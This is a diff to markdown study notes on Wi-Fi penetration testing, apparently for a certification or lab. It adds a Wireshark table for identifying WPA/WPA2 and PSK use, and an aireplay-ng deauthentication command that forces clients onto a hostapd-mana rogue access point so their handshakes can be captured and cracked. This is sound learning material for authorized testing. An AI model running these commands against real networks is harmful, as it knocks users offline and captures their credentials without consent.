@@ -360,9 +360,12 @@ As airmon-ng reports only the highest levels of encryption supported, we use Wir
 | `wlan.fc.type_subtype == 0x08` | Display beacon packets . Beacon = 8. Management = 0.  
 | `&& wlan.ssid == "AP-Name"` | Only target the desired AP 
 
-PSK  
-CCM 
-WPS  
+| IEEE 802.11 Wireless Management>Tagged Parameters    | Description |
+|--|--|
+| `TAG RSN Information visible` | WPA2 Supported.  
+| `TAG Vendor Specific MS Corp WPA Information Element` | WPA Supported 
+| `Auth Key Management ... PSK` | PSK in use
+| `TAG Vendor Specific MS Corp WPA Information Element>Unicatse Cipher Suite` | Shows maybe AES(CCM) (CCMP) and TKIP   
 
 ### Creating Rogue AP  
 `hostapd-mana` - Tool for creating a Rogue AP.  
@@ -383,7 +386,7 @@ rsn_pairwise=TKIP CCMP
 mana_wpaout=/outputfile.hccapx
 ``` 
 
-| Options | Description |
+| Options | Description | 
 |--|--|
 | `hw_mode=g` | 2.4GHz
 | `hw_mode=a` | 5GHz
@@ -401,6 +404,10 @@ mana_wpaout=/outputfile.hccapx
 `hostapd-mana AP-Name.conf` 
 
 Client will connect. (de-auth) and ensure stronger signal.  
+To deauth - Use another interface to execute aireplay-ng to deauth!   
+`airmon-ng start wlan1 3` = Set wlan1 interface on monitor mode on channel 3
+`aireplay-ng -0 0 -a <AP-MAC> wlan1mon`  
+
 We can capture the handshake.  
 
 3. Crack Handshake with Hashcat or aircrack-ng  
